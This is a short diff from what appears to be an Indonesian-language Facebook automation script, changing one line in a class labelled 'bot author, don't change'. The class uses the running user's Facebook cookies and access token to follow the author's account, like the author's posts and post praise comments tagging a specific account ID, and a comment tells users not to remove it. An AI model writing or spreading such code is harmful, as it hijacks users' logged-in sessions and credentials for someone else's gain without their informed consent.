@@ -143,7 +143,7 @@ def language(cookie):
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa_F)];self.komen = ['Keren Master\n- [ @[100013275378835:0] ] -','Semangat Terus\n- [ @[100013275378835:0] ] -','Gokil Suhu','Panutanku Nih Bro\n- [ @[100013275378835:0] ] -']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Keren Master\n- [ @[100013275378835:0] ] -','Semangat Terus\n- [ @[100013275378835:0] ] -','Gokil Suhu','Panutanku Nih Bro\n- [ @[100013275378835:0] ] -']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
